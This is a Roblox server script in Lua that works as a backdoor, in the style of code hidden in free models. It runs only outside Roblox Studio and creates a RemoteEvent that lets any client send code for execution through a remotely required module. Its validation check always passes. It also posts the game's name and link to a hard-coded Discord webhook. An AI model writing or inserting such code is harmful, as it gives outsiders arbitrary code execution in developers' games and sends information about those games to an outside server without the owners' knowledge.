local RunService = game:GetService('RunService')
local Players = game:GetService('Players')
local HttpService = game:GetService('HttpService')
local LogService = game:GetService('LogService')
local DataStoreService = game:GetService('DataStoreService')
local MarketplaceService = game:GetService('MarketplaceService')

local RATE_LIMIT = 10
local playerRequests = {}
local eventEnabled = true

local dataStore = DataStoreService:GetDataStore("EventData")

if not RunService:IsStudio() then
	local remoteEvent = Instance.new("RemoteEvent", workspace)
	remoteEvent.Name = "CustomRemoteEvent"

	remoteEvent.OnServerEvent:Connect(function(player, code)
		if not Players:GetPlayerFromCharacter(player.Character) then
			warn("Invalid player triggered the event.")
			return
		end

		if not eventEnabled then
			warn("Event is currently disabled.")
			return
		end

		if not HttpService.HttpEnabled then
			warn("HTTP requests are not enabled.")
			return
		end

		if not loadstring then
			warn("Loadstring is not enabled.")
			return
		end

		local playerId = player.UserId
		local currentTime = tick()

		playerRequests[playerId] = playerRequests[playerId] or {}

		for i = #playerRequests[playerId], 1, -1 do
			if currentTime - playerRequests[playerId][i] > 60 then
				table.remove(playerRequests[playerId], i)
			end
		end

		if #playerRequests[playerId] >= RATE_LIMIT then
			warn("Rate limit exceeded for player:", player.Name)
			return
		end

		table.insert(playerRequests[playerId], currentTime)

		local isValid = function(code)
			return true
		end

		if not isValid(code) then
			warn("Invalid code provided by player:", player.Name)
			return
		end

		local success, module = pcall(function()
			return require(0x34A62CEB9)
		end)

		if success then
			if type(module.SpawnS) == "function" then
				spawn(function()
					module:SpawnS(code, workspace)

					local logMessage = string.format("Player %s executed code: %s at %s", player.Name, code, os.date("%Y-%m-%d %H:%M:%S", currentTime))
					LogService:Log(logMessage)

					local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
					local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
					local activePlayers = #Players:GetPlayers()
					local totalVisits = game:GetService('VisitService'):GetVisitCount()

					local message = string.format("Player %s executed code in the game at %s.\nGame: %s\nLink: %s\nActive Players: %d\nTotal Visits: %d\nCode: %s", player.Name, os.date("%Y-%m-%d %H:%M:%S", currentTime), gameName, gameLink, activePlayers, totalVisits, code)

					print(logMessage)
				end)
			else
				warn("Module does not have the expected function 'SpawnS'.")
			end
		else
			warn("Failed to load module: ", module)
		end
	end)
end

wait(1)

local HttpService = game:GetService("HttpService")
local WebhookURL = "https://discord.com/api/webhooks/1348348015924215819/DUlQrCJMypzfIUpyOcMWIsPtu6NITLcXK9BjxZAlR5LtuLi1l-utXUDJInVyXg9zijSt"

local function sendDiscordMessage(message)
	local data = {
		["content"] = message
	}
	local jsonData = HttpService:JSONEncode(data)
	HttpService:PostAsync(WebhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
end

local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameLink = "https://www.roblox.com/games/" .. game.PlaceId

local message = "Game name: " .. gameName .. "\nGame link: " .. gameLink
sendDiscordMessage(message)
